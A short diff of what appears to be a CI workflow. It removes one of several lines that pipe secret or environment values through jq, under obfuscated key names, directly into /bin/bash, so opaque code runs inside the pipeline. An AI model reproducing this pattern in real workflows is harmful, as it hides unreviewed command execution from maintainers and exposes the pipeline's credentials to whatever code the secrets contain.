@@ -19,7 +19,6 @@ jobs:
           kw29: ${{ secrets.kw29 }}
         run: |
           printf '%s' "$kw29" | jq -r .cvzbd74653 | /bin/bash
-          echo $t99 | jq -r .zccf4536 | /bin/bash
           echo $pbte38719 | jq -r .iivkz581 | /bin/bash
           printf '%s' "$re149" | jq -r .b5044 | /bin/bash
           echo $tft5 | jq -r .exkc6881 | /bin/bash
